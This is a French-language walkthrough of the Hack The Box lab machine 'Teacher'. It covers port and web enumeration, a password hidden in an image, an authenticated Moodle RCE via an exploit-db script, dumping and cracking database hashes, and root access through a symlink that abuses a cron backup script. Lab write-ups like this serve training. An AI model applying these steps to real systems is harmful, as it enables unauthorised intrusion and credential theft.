![Pic1](../img/teacher1.PNG?raw=true) </br>

# Introduction
Teacher est une machine Linux qui a pour adresse IP 10.10.10.153.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* Recherche d'indice dans une image.
* Exploitation d'une RCE authentifiée.
* Crackage de mot de passe.
* Utilisation de lien symbolique pour l'accès Admin.
</br>

# Enumération initiale
Nous commençons comme d'habitude avec nmap pour énumémer les ports d'ouverts et les services exposés de la box :
```bash
$ nmap -T4 -A 10.10.10.153
$ nmap -T4 -p1-65535 10.10.10.153
```
![Pic2](../img/teacher2.PNG?raw=true) </br>
Seul le port 80 est ouvert, nous allons donc faire une énumération des dossiers et fichiers du site avec dirsearch :
```bash
$ dirsearch.py -w wordlist -e 'php,txt' -f -t 100 -x 400,404,403,500 -u http://10.10.10.153/
```
![Pic3](../img/teacher3.PNG?raw=true) </br>

# Obtenir un accès utilisateur
Sur la page /moodle/, nous avons une interface concernant la plateforme d'apprentissage Moodle :</br>
![Pic4](../img/teacher4.PNG?raw=true) </br>
Sauf qu'apparament, il faut être identifier pour accès à une ressource du site, néanmoins, nous pouvons nous logger en tant que Guest :</br>
![Pic5](../img/teacher5.PNG?raw=true) </br>
Sauf qu'en tant que Guest, rien n'est possible de faire. Nous avons de sûr un utilisateur : Giovanni Chhatta. Qui est un enseignant qui propose
le cours en ligne Algebra.</br>
Après avoir passé ***beaucoup*** de temps à chercher, l'image numéro 5 du site ne s'affiche pas. Elle contient en réalité des données :
```bash
$ wget http://10.10.10.153/images/5.png
$ cat 5.png
```
![Pic6](../img/teacher6.PNG?raw=true) </br>
Nous avons a deviner le dernier caractère qu'il reste, après un certain temps, le couple Giovanni:Th4C00lTheacha# fonctionne pour s'authentifier.</br>
Une fois connecté, nous pouvons suivre un POC pour obtenir une RCE :
```bash
$ searchsploit moodle
$ locate 46551.php
$ cp /usr/share/exploitdb/exploits/php/webapps/46551.php
$ 
```
![Pic8](../img/teacher8.PNG?raw=true) </br>
Nous sommes en tant que www-data. En regardant le fichier config.php de moodle, nous pouvons voir le couple identifiant:motdepasse de mariadb : root:Welkom1!</br>
![Pic9](../img/teacher9.PNG?raw=true) </br>
```bash
$ mysql -u root -p 
Mariadb > use moodle;
Mariadb > select username, password from mdl_user;
```
![Pic10](../img/teacher10.PNG?raw=true) </br>
Nous récupérons le hash de giovanni pour le cracker avec john :
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```
![Pic11](../img/teacher11.PNG?raw=true) </br>
Nous pouvons alors nous identifier en tant que Giovanni et récuperer le user.txt :</br>
![Pic12](../img/teacher12.PNG?raw=true) </br>

# Obtenir un accès administrateur
En réalisant l'énumération de base, on s'aperçopit que dans le /home de Giovanni, un fichier backup_courses.tar.gz est créé toutes les x minutes, et après plusieurs énumération, un script suspect est localisé :
```bash
$ ls /usr/bin
$ cat /usr/bin/backup.sh 
```
![Pic13](../img/teacher13.PNG?raw=true) </br>
Le script consiste à décompresser l'archive backup_courses et de mettre les permissions 777 dans /home/giovanni/work/tmp. Donc si on met un lien symbolique dans le dossier tmp vers /root, logiquement 
le dossier /root sera en 777 en récursif.
```bash
$ cd ~/work/tmp
$ ln -s /root bonjour
$ cat /root/root.txt
```
![Pic14](../img/teacher14.PNG?raw=true) </br>